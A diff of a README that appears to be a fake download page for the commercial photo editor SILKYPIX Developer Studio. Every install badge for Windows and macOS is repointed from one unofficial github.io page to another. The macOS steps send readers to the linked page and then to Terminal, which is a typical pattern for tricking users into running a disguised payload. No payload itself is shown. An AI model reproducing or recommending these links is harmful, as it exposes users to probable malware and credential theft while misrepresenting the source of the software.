@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install SILKYPIX Developer Studio](https://img.shields.io/badge/⬇_Install_SILKYPIX+Developer+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install SILKYPIX Developer Studio](https://img.shields.io/badge/⬇_Install_SILKYPIX+Developer+Studio-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -61,9 +61,9 @@ SILKYPIX Developer Studio is a professional RAW photo development application fo
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ SILKYPIX Developer Studio is a professional RAW photo development application fo
 
 <div align="center">
 
-[![⬇ Install SILKYPIX Developer Studio](https://img.shields.io/badge/⬇_Install_SILKYPIX+Developer+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install SILKYPIX Developer Studio](https://img.shields.io/badge/⬇_Install_SILKYPIX+Developer+Studio-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ SILKYPIX Developer Studio is a professional RAW photo development application fo
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ SILKYPIX Developer Studio is a professional RAW photo development application fo
 
 <div align="center">
 
-[![⬇ Install SILKYPIX Developer Studio](https://img.shields.io/badge/⬇_Install_SILKYPIX+Developer+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install SILKYPIX Developer Studio](https://img.shields.io/badge/⬇_Install_SILKYPIX+Developer+Studio-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
